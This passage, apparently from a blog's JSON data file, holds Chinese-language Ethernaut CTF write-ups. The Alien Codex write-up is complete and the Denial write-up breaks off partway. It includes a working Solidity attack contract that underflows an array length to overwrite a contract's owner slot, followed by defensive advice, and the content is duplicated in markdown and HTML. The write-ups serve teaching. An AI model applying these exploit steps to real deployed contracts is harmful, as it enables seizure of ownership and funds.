assertNotEq(instance.owner(), player);\n        attacker = new Attack(address(instance));\n    }\n\n    function testAttack() public {\n        vm.startPrank(player);\n        attacker.attack();\n        vm.stopPrank();\n        assertEq(instance.owner(), player);\n    }\n}\n\ncontract Attack {\n    AlienCodex public instance;\n\n    constructor(address _instanceAddress) {\n        instance = AlienCodex(_instanceAddress);\n    }\n\n    function attack() public {\n        // 1. 成为联系人，绕过 modifier\n        instance.makeContact();\n\n        // 2. 调用 retract() 触发数组长度下溢\n        instance.retract();\n\n        // 3. 计算覆盖 slot 0 所需的索引\n        uint256 slot0_index;\n        unchecked {\n            slot0_index = type(uint256).max - uint256(keccak256(abi.encode(1))) + 1;\n        }\n\n        // 4. 调用 revise() 将 owner 修改为我们的地址\n        instance.revise(slot0_index, bytes32(uint256(uint160(msg.sender))));\n    }\n}\n```\n\n### 关键攻击步骤\n\n1.  **调用 `makeContact()`**: 解除对其他函数的调用限制。\n2.  **调用 `retract()`**: 在 `codex` 数组为空时调用，利用整数下溢将数组长度变为 `type(uint256).max`。\n3.  **计算目标索引**: 计算出能让数组访问“环绕”到存储槽0的索引 `i = 2**256 - keccak256(1)`。\n4.  **调用 `revise()`**: 使用计算出的索引和 `player` 的地址作为参数调用 `revise`，这会覆盖 slot 0 的内容，从而改变 `owner`。\n\n## 🛡️ 防御措施\n\n1.  **使用安全的Solidity版本**: 从 `0.8.0` 版本开始，Solidity 默认会对所有算术运算进行上溢和下溢检查。这是防止此类漏洞最简单、最有效的方法。\n2.  **使用 `SafeMath` 库**: 如果必须使用旧版本的Solidity，应始终使用 `SafeMath` 或类似的库来执行所有算术运算，以防止溢出。\n3.  **谨慎处理动态数组**: 动态数组的存储管理很复杂。应避免允许用户直接控制可能导致存储冲突的操作，如无限制地增加或减少数组长度。\n\n## 🔧 相关工具和技术\n\n-   **整数溢出 (Overflow/Underflow)**: 在旧版本Solidity中一个非常常见的漏洞类别。当一个整数变量增加超过其最大值（上溢）或减少到小于其最小值（下溢）时发生。\n-   **动态数组的存储布局**: 理解动态数组的长度和数据是如何在存储中布局的，是发现和利用存储操纵漏洞的关键。\n-   **`keccak256`**: EVM中用于计算哈希的核心函数，它在确定存储位置时扮演着重要角色。\n-   **Foundry `unchecked`**: 在Solidity `^0.8.0` 中，可以使用 `unchecked` 块来故意允许溢出，这在复现旧版本漏洞或进行特定位操作时很有用。\n\n## 🎯 总结\n\n**核心概念**:\n-   旧版Solidity（<0.8.0）的整数运算默认不检查溢出。\n-   动态数组的长度可以被操纵，以访问合约的整个256位存储空间。\n-   合约的存储槽位可以通过 `keccak256` 哈希进行确定性计算。\n\n**攻击向量**:\n-   通过整数下溢一个动态数组的长度，获得对合约任意存储位置的写权限。\n-   计算出指向 `owner` 变量所在存储槽（slot 0）的数组索引。\n-   调用数组的写函数（`revise`）来覆盖 `owner`。\n\n**防御策略**:\n-   始终使用最新的、安全的Solidity版本。\n-   如果使用旧版本，必须使用 `SafeMath`。\n-   对所有外部输入进行严格的验证，特别是那些影响状态变量（如数组长度）的输入。\n\n## 📚 参考资料\n\n-   [Solidity Docs: Mapping and Dynamic Arrays](https://docs.soliditylang.org/en/v0.5.0/internals/layout_in_storage.html#mappings-and-dynamic-arrays)\n-   [Consensys: Integer Overflow and Underflow](https://consensys.net/diligence/blog/2018/05/integer-overflow-and-underflow/)","slug":"ethernaut-level-19-alien-codex","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbph001fbf5q4cm5anjz","content":"<h1 id=\"🎯-Ethernaut-Level-19-Alien-Codex-动态数组存储操纵\"><a href=\"#🎯-Ethernaut-Level-19-Alien-Codex-动态数组存储操纵\" class=\"headerlink\" title=\"🎯 Ethernaut Level 19: Alien Codex - 动态数组存储操纵\"></a>🎯 Ethernaut Level 19: Alien Codex - 动态数组存储操纵</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/19\">Ethernaut Level 19 - Alien Codex</a><br><strong>攻击类型</strong>: 存储操纵 &#x2F; 整数下溢<br><strong>难度</strong>: ⭐⭐⭐⭐⭐</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>本关的目标是获取 <code>AlienCodex</code> 合约的所有权。这是一个继承了 <code>Ownable</code> 的合约，<code>owner</code> 存储在 slot 0。</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel19.svg\" alt=\"Alien Codex Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><p><code>AlienCodex</code> 合约使用了一个旧的 Solidity 版本 (<code>^0.5.0</code>)，这意味着整数操作不会进行溢出检查。这是本关的核心漏洞。合约的存储布局如下：</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">Slot</th>\n<th align=\"left\">变量名</th>\n<th align=\"left\">类型</th>\n<th align=\"left\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">0</td>\n<td align=\"left\"><code>contact</code></td>\n<td align=\"left\"><code>bool</code></td>\n<td align=\"left\">与 <code>owner</code> 打包在同一个槽位</td>\n</tr>\n<tr>\n<td align=\"left\">0</td>\n<td align=\"left\"><code>owner</code></td>\n<td align=\"left\"><code>address</code></td>\n<td align=\"left\">继承自 <code>Ownable</code>，位于 slot 0</td>\n</tr>\n<tr>\n<td align=\"left\">1</td>\n<td align=\"left\"><code>codex</code></td>\n<td align=\"left\"><code>bytes32[]</code></td>\n<td align=\"left\">动态数组，slot 1 存储其长度</td>\n</tr>\n</tbody></table>\n<p>合约中的函数都受到 <code>contacted</code> 修饰符的限制，我们必须先调用 <code>makeContact()</code> 将 <code>contact</code> 设置为 <code>true</code>。</p>\n<p>关键漏洞在 <code>retract()</code> 函数中：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// From AlienCodex.sol (Solidity v0.5.0)</span><br><span class=\"line\">function retract() public contacted &#123;</span><br><span class=\"line\">    codex.length--;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>由于没有溢出检查，如果 <code>codex.length</code> 为0，执行 <code>codex.length--</code> 会导致整数下溢，使其长度变为 <code>2**256 - 1</code>。一个长度为 <code>2**256 - 1</code> 的动态数组可以覆盖整个合约的存储空间！</p>\n<p>拥有一个可以写到任意存储位置的数组后，我们的目标是覆盖 slot 0 中的 <code>owner</code> 变量。我们需要找到哪个数组索引 <code>i</code> 对应于存储槽 <code>0</code>。</p>\n<p>动态数组的数据存储位置是从 <code>keccak256(p)</code> 开始的，其中 <code>p</code> 是数组长度所在的槽位。在本例中，<code>codex</code> 的长度存储在 slot 1，所以它的数据起始位置是 <code>keccak256(1)</code>。</p>\n<ul>\n<li><code>codex[0]</code> 存储在 <code>keccak256(1)</code></li>\n<li><code>codex[i]</code> 存储在 <code>keccak256(1) + i</code></li>\n</ul>\n<p>我们想写入的位置是 slot 0。因此，我们需要找到一个索引 <code>i</code>，使得 <code>keccak256(1) + i</code> 在 <code>2**256</code> 的模运算下等于 <code>0</code>。</p>\n<p><code>keccak256(1) + i = 2**256</code><br><code>i = 2**256 - keccak256(1)</code></p>\n<p>一旦我们计算出这个索引 <code>i</code>，我们就可以调用 <code>revise(i, our_address)</code> 来将 <code>owner</code> 修改为我们自己的地址。</p>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><p>攻击合约将执行上述的三个步骤：建立联系、触发下溢、计算索引并修改 <code>owner</code>。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/19_AlienCodex.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract AlienCodexTest is Test &#123;</span><br><span class=\"line\">    AlienCodex instance;</span><br><span class=\"line\">    Attack attacker;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\">        instance = new AlienCodex();</span><br><span class=\"line\">        assertNotEq(instance.owner(), player);</span><br><span class=\"line\">        attacker = new Attack(address(instance));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testAttack() public &#123;</span><br><span class=\"line\">        vm.startPrank(player);</span><br><span class=\"line\">        attacker.attack();</span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        assertEq(instance.owner(), player);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    AlienCodex public instance;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _instanceAddress) &#123;</span><br><span class=\"line\">        instance = AlienCodex(_instanceAddress);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function attack() public &#123;</span><br><span class=\"line\">        // 1. 成为联系人，绕过 modifier</span><br><span class=\"line\">        instance.makeContact();</span><br><span class=\"line\"></span><br><span class=\"line\">        // 2. 调用 retract() 触发数组长度下溢</span><br><span class=\"line\">        instance.retract();</span><br><span class=\"line\"></span><br><span class=\"line\">        // 3. 计算覆盖 slot 0 所需的索引</span><br><span class=\"line\">        uint256 slot0_index;</span><br><span class=\"line\">        unchecked &#123;</span><br><span class=\"line\">            slot0_index = type(uint256).max - uint256(keccak256(abi.encode(1))) + 1;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        // 4. 调用 revise() 将 owner 修改为我们的地址</span><br><span class=\"line\">        instance.revise(slot0_index, bytes32(uint256(uint160(msg.sender))));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>调用 <code>makeContact()</code></strong>: 解除对其他函数的调用限制。</li>\n<li><strong>调用 <code>retract()</code></strong>: 在 <code>codex</code> 数组为空时调用，利用整数下溢将数组长度变为 <code>type(uint256).max</code>。</li>\n<li><strong>计算目标索引</strong>: 计算出能让数组访问“环绕”到存储槽0的索引 <code>i = 2**256 - keccak256(1)</code>。</li>\n<li><strong>调用 <code>revise()</code></strong>: 使用计算出的索引和 <code>player</code> 的地址作为参数调用 <code>revise</code>，这会覆盖 slot 0 的内容，从而改变 <code>owner</code>。</li>\n</ol>\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><ol>\n<li><strong>使用安全的Solidity版本</strong>: 从 <code>0.8.0</code> 版本开始，Solidity 默认会对所有算术运算进行上溢和下溢检查。这是防止此类漏洞最简单、最有效的方法。</li>\n<li><strong>使用 <code>SafeMath</code> 库</strong>: 如果必须使用旧版本的Solidity，应始终使用 <code>SafeMath</code> 或类似的库来执行所有算术运算，以防止溢出。</li>\n<li><strong>谨慎处理动态数组</strong>: 动态数组的存储管理很复杂。应避免允许用户直接控制可能导致存储冲突的操作，如无限制地增加或减少数组长度。</li>\n</ol>\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><ul>\n<li><strong>整数溢出 (Overflow&#x2F;Underflow)</strong>: 在旧版本Solidity中一个非常常见的漏洞类别。当一个整数变量增加超过其最大值（上溢）或减少到小于其最小值（下溢）时发生。</li>\n<li><strong>动态数组的存储布局</strong>: 理解动态数组的长度和数据是如何在存储中布局的，是发现和利用存储操纵漏洞的关键。</li>\n<li><strong><code>keccak256</code></strong>: EVM中用于计算哈希的核心函数，它在确定存储位置时扮演着重要角色。</li>\n<li><strong>Foundry <code>unchecked</code></strong>: 在Solidity <code>^0.8.0</code> 中，可以使用 <code>unchecked</code> 块来故意允许溢出，这在复现旧版本漏洞或进行特定位操作时很有用。</li>\n</ul>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li>旧版Solidity（&lt;0.8.0）的整数运算默认不检查溢出。</li>\n<li>动态数组的长度可以被操纵，以访问合约的整个256位存储空间。</li>\n<li>合约的存储槽位可以通过 <code>keccak256</code> 哈希进行确定性计算。</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>通过整数下溢一个动态数组的长度，获得对合约任意存储位置的写权限。</li>\n<li>计算出指向 <code>owner</code> 变量所在存储槽（slot 0）的数组索引。</li>\n<li>调用数组的写函数（<code>revise</code>）来覆盖 <code>owner</code>。</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>始终使用最新的、安全的Solidity版本。</li>\n<li>如果使用旧版本，必须使用 <code>SafeMath</code>。</li>\n<li>对所有外部输入进行严格的验证，特别是那些影响状态变量（如数组长度）的输入。</li>\n</ul>\n<h2 id=\"📚-参考资料\"><a href=\"#📚-参考资料\" class=\"headerlink\" title=\"📚 参考资料\"></a>📚 参考资料</h2><ul>\n<li><a href=\"https://docs.soliditylang.org/en/v0.5.0/internals/layout_in_storage.html#mappings-and-dynamic-arrays\">Solidity Docs: Mapping and Dynamic Arrays</a></li>\n<li><a href=\"https://consensys.net/diligence/blog/2018/05/integer-overflow-and-underflow/\">Consensys: Integer Overflow and Underflow</a></li>\n</ul>\n","more":"<h1 id=\"🎯-Ethernaut-Level-19-Alien-Codex-动态数组存储操纵\"><a href=\"#🎯-Ethernaut-Level-19-Alien-Codex-动态数组存储操纵\" class=\"headerlink\" title=\"🎯 Ethernaut Level 19: Alien Codex - 动态数组存储操纵\"></a>🎯 Ethernaut Level 19: Alien Codex - 动态数组存储操纵</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/19\">Ethernaut Level 19 - Alien Codex</a><br><strong>攻击类型</strong>: 存储操纵 &#x2F; 整数下溢<br><strong>难度</strong>: ⭐⭐⭐⭐⭐</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>本关的目标是获取 <code>AlienCodex</code> 合约的所有权。这是一个继承了 <code>Ownable</code> 的合约，<code>owner</code> 存储在 slot 0。</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel19.svg\" alt=\"Alien Codex Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><p><code>AlienCodex</code> 合约使用了一个旧的 Solidity 版本 (<code>^0.5.0</code>)，这意味着整数操作不会进行溢出检查。这是本关的核心漏洞。合约的存储布局如下：</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">Slot</th>\n<th align=\"left\">变量名</th>\n<th align=\"left\">类型</th>\n<th align=\"left\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">0</td>\n<td align=\"left\"><code>contact</code></td>\n<td align=\"left\"><code>bool</code></td>\n<td align=\"left\">与 <code>owner</code> 打包在同一个槽位</td>\n</tr>\n<tr>\n<td align=\"left\">0</td>\n<td align=\"left\"><code>owner</code></td>\n<td align=\"left\"><code>address</code></td>\n<td align=\"left\">继承自 <code>Ownable</code>，位于 slot 0</td>\n</tr>\n<tr>\n<td align=\"left\">1</td>\n<td align=\"left\"><code>codex</code></td>\n<td align=\"left\"><code>bytes32[]</code></td>\n<td align=\"left\">动态数组，slot 1 存储其长度</td>\n</tr>\n</tbody></table>\n<p>合约中的函数都受到 <code>contacted</code> 修饰符的限制，我们必须先调用 <code>makeContact()</code> 将 <code>contact</code> 设置为 <code>true</code>。</p>\n<p>关键漏洞在 <code>retract()</code> 函数中：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// From AlienCodex.sol (Solidity v0.5.0)</span><br><span class=\"line\">function retract() public contacted &#123;</span><br><span class=\"line\">    codex.length--;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>由于没有溢出检查，如果 <code>codex.length</code> 为0，执行 <code>codex.length--</code> 会导致整数下溢，使其长度变为 <code>2**256 - 1</code>。一个长度为 <code>2**256 - 1</code> 的动态数组可以覆盖整个合约的存储空间！</p>\n<p>拥有一个可以写到任意存储位置的数组后，我们的目标是覆盖 slot 0 中的 <code>owner</code> 变量。我们需要找到哪个数组索引 <code>i</code> 对应于存储槽 <code>0</code>。</p>\n<p>动态数组的数据存储位置是从 <code>keccak256(p)</code> 开始的，其中 <code>p</code> 是数组长度所在的槽位。在本例中，<code>codex</code> 的长度存储在 slot 1，所以它的数据起始位置是 <code>keccak256(1)</code>。</p>\n<ul>\n<li><code>codex[0]</code> 存储在 <code>keccak256(1)</code></li>\n<li><code>codex[i]</code> 存储在 <code>keccak256(1) + i</code></li>\n</ul>\n<p>我们想写入的位置是 slot 0。因此，我们需要找到一个索引 <code>i</code>，使得 <code>keccak256(1) + i</code> 在 <code>2**256</code> 的模运算下等于 <code>0</code>。</p>\n<p><code>keccak256(1) + i = 2**256</code><br><code>i = 2**256 - keccak256(1)</code></p>\n<p>一旦我们计算出这个索引 <code>i</code>，我们就可以调用 <code>revise(i, our_address)</code> 来将 <code>owner</code> 修改为我们自己的地址。</p>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><p>攻击合约将执行上述的三个步骤：建立联系、触发下溢、计算索引并修改 <code>owner</code>。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/19_AlienCodex.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract AlienCodexTest is Test &#123;</span><br><span class=\"line\">    AlienCodex instance;</span><br><span class=\"line\">    Attack attacker;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\">        instance = new AlienCodex();</span><br><span class=\"line\">        assertNotEq(instance.owner(), player);</span><br><span class=\"line\">        attacker = new Attack(address(instance));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testAttack() public &#123;</span><br><span class=\"line\">        vm.startPrank(player);</span><br><span class=\"line\">        attacker.attack();</span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        assertEq(instance.owner(), player);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    AlienCodex public instance;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _instanceAddress) &#123;</span><br><span class=\"line\">        instance = AlienCodex(_instanceAddress);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function attack() public &#123;</span><br><span class=\"line\">        // 1. 成为联系人，绕过 modifier</span><br><span class=\"line\">        instance.makeContact();</span><br><span class=\"line\"></span><br><span class=\"line\">        // 2. 调用 retract() 触发数组长度下溢</span><br><span class=\"line\">        instance.retract();</span><br><span class=\"line\"></span><br><span class=\"line\">        // 3. 计算覆盖 slot 0 所需的索引</span><br><span class=\"line\">        uint256 slot0_index;</span><br><span class=\"line\">        unchecked &#123;</span><br><span class=\"line\">            slot0_index = type(uint256).max - uint256(keccak256(abi.encode(1))) + 1;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        // 4. 调用 revise() 将 owner 修改为我们的地址</span><br><span class=\"line\">        instance.revise(slot0_index, bytes32(uint256(uint160(msg.sender))));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>调用 <code>makeContact()</code></strong>: 解除对其他函数的调用限制。</li>\n<li><strong>调用 <code>retract()</code></strong>: 在 <code>codex</code> 数组为空时调用，利用整数下溢将数组长度变为 <code>type(uint256).max</code>。</li>\n<li><strong>计算目标索引</strong>: 计算出能让数组访问“环绕”到存储槽0的索引 <code>i = 2**256 - keccak256(1)</code>。</li>\n<li><strong>调用 <code>revise()</code></strong>: 使用计算出的索引和 <code>player</code> 的地址作为参数调用 <code>revise</code>，这会覆盖 slot 0 的内容，从而改变 <code>owner</code>。</li>\n</ol>\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><ol>\n<li><strong>使用安全的Solidity版本</strong>: 从 <code>0.8.0</code> 版本开始，Solidity 默认会对所有算术运算进行上溢和下溢检查。这是防止此类漏洞最简单、最有效的方法。</li>\n<li><strong>使用 <code>SafeMath</code> 库</strong>: 如果必须使用旧版本的Solidity，应始终使用 <code>SafeMath</code> 或类似的库来执行所有算术运算，以防止溢出。</li>\n<li><strong>谨慎处理动态数组</strong>: 动态数组的存储管理很复杂。应避免允许用户直接控制可能导致存储冲突的操作，如无限制地增加或减少数组长度。</li>\n</ol>\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><ul>\n<li><strong>整数溢出 (Overflow&#x2F;Underflow)</strong>: 在旧版本Solidity中一个非常常见的漏洞类别。当一个整数变量增加超过其最大值（上溢）或减少到小于其最小值（下溢）时发生。</li>\n<li><strong>动态数组的存储布局</strong>: 理解动态数组的长度和数据是如何在存储中布局的，是发现和利用存储操纵漏洞的关键。</li>\n<li><strong><code>keccak256</code></strong>: EVM中用于计算哈希的核心函数，它在确定存储位置时扮演着重要角色。</li>\n<li><strong>Foundry <code>unchecked</code></strong>: 在Solidity <code>^0.8.0</code> 中，可以使用 <code>unchecked</code> 块来故意允许溢出，这在复现旧版本漏洞或进行特定位操作时很有用。</li>\n</ul>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li>旧版Solidity（&lt;0.8.0）的整数运算默认不检查溢出。</li>\n<li>动态数组的长度可以被操纵，以访问合约的整个256位存储空间。</li>\n<li>合约的存储槽位可以通过 <code>keccak256</code> 哈希进行确定性计算。</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>通过整数下溢一个动态数组的长度，获得对合约任意存储位置的写权限。</li>\n<li>计算出指向 <code>owner</code> 变量所在存储槽（slot 0）的数组索引。</li>\n<li>调用数组的写函数（<code>revise</code>）来覆盖 <code>owner</code>。</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>始终使用最新的、安全的Solidity版本。</li>\n<li>如果使用旧版本，必须使用 <code>SafeMath</code>。</li>\n<li>对所有外部输入进行严格的验证，特别是那些影响状态变量（如数组长度）的输入。</li>\n</ul>\n<h2 id=\"📚-参考资料\"><a href=\"#📚-参考资料\" class=\"headerlink\" title=\"📚 参考资料\"></a>📚 参考资料</h2><ul>\n<li><a href=\"https://docs.soliditylang.org/en/v0.5.0/internals/layout_in_storage.html#mappings-and-dynamic-arrays\">Solidity Docs: Mapping and Dynamic Arrays</a></li>\n<li><a href=\"https://consensys.net/diligence/blog/2018/05/integer-overflow-and-underflow/\">Consensys: Integer Overflow and Underflow</a></li>\n</ul>\n"},{"title":"Ethernaut Level 20: Denial - 通过外部调用实现拒绝服务","date":"2025-01-25T08:45:00.000Z","updated":"2025-01-25T08:45:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"学习如何利用一个不受信任的外部调用来发动拒绝服务（DoS）攻击。通过设置一个恶意的 `partner` 合约，使其在接收以太币时耗尽所有 Gas，从而阻止 `owner` 提取资金，掌握 Denial 关卡的破解技巧。","_content":"\n# 🎯 Ethernaut Level 20: Denial - 通过外部调用实现拒绝服务\n\n> **关卡链接**: [Ethernaut Level 20 - Denial](https://ethernaut.openzeppelin.com/level/20)  \n> **攻击类型**: 拒绝服务 (Denial of Service - DoS)  \n> **难度**: ⭐⭐☆☆☆\n\n## 📋 挑战目标\n\n本关的目标是阻止 `owner` 从合约中提取资金。你需要让 `withdraw()` 函数无法成功执行，从而实现拒绝服务攻击。\n\n![Denial Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel20.svg)\n\n## 🔍 漏洞分析\n\n让我们仔细看看 `withdraw()` 函数的实现：\n\n```solidity\ncontract Denial {\n    // ...\n    address public partner; // The partner can be set by anyone.\n\n    function setWithdrawPartner(address _partner) public {\n        partner = _partner;\n    }\n\n    function withdraw() public {\n        uint amountToSend = address(this).balance / 100;\n        \n        // Perform the call. We don't check the return value.\n        partner.call{value: amountToSend}(\"\");\n        \n        payable(owner).transfer(amountToSend);\n    }\n}\n```\n\n漏洞点非常明确：\n\n1.  **任意设置 `partner`**: 任何人都可以调用 `setWithdrawPartner()` 来设置 `partner` 地址。这意味着我们可以将 `partner` 设置为我们自己控制的恶意合约。\n2.  **未检查的外部调用**: `partner.call{value: amountToSend}(\"\")` 是一个对外部合约的调用。关键在于，代码**没有检查 `call` 的返回值**。如果这个 `call` 失败，函数会继续执行。\n3.  **Gas 转发**: `call` 默认会转发所有剩余的 Gas。如果 `partner` 合约的 